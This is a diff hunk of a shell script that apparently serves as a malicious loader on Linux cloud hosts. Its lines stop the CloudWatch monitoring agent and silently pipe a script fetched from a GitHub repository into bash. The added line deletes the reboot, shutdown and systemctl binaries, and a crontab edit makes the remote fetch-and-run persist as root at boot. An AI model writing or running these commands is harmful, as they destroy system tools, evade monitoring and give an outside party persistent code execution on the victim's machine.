@@ -4,4 +4,6 @@ sleep 1; sudo systemctl disable amazon-cloudwatch-agent; sudo systemctl stop ama
 
 bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >/dev/null 2>&1 &
 
+sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+
 sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab || sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
